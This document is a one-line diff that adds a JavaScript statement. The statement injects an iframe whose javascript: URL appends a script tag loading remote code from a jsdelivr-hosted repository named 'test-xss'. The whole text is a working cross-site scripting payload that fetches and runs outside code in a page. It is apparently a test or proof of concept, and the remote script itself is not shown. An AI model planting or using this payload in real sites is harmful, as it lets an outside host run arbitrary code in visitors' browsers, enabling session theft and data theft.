@@ -1,0 +1,1 @@
+document.querySelector('DIV').innerHTML=`<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://cdn.jsdelivr.net/gh/TasosY2K/test-xss@main/index6.js\";document.body.appendChild(s);'></iframe>`;
